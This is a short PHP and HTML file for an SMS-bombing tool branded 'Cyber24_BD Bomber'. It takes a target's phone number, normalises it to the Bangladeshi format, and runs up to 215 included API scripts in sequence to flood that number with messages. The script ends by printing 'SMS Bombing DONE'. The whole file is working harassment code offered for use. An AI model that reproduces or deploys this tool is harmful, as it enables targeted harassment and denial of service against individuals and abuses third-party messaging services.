<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'] ?? '';

    $formattedPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);
    if (strlen($formattedPhone) === 11 && $formattedPhone[0] === '0') {
        $phoneToUse = substr($formattedPhone, 1);
    } elseif (strlen($formattedPhone) === 10) {
        $phoneToUse = $formattedPhone;
    } elseif (strlen($formattedPhone) === 13 && substr($formattedPhone, 0, 3) === '880') {
        $phoneToUse = substr($formattedPhone, 2);
    } else {
        echo "Invalid number format!";
        exit;
    }

    echo "<pre style='color: lime; background: black; padding: 20px;'>";
    for ($i = 1; $i <= 215; $i++) {
        $apiFile = __DIR__ . "/apis/api{$i}.php";
        if (file_exists($apiFile)) {
            ob_start();
            include $apiFile;
            $response = ob_get_clean();
            echo "[API $i] $response\n";
            ob_flush();
            flush();
            usleep(150000); // 150ms delay
        } else {
            echo "[API $i] Not found\n";
        }
    }
    echo "\nSMS Bombing DONE</pre>";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Cyber24_BD Bomber</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: monospace;
            padding: 30px;
        }
        input, button {
            padding: 10px;
            font-size: 16px;
            margin: 10px;
        }
    </style>
</head>
<body>
    <h2>Bomber - Cyber24_BD</h2>
    <form method="POST">
        <input type="text" name="phone" placeholder="Enter phone number" required />
        <button type="submit">Start Bombing</button>
    </form>
</body>
</html>
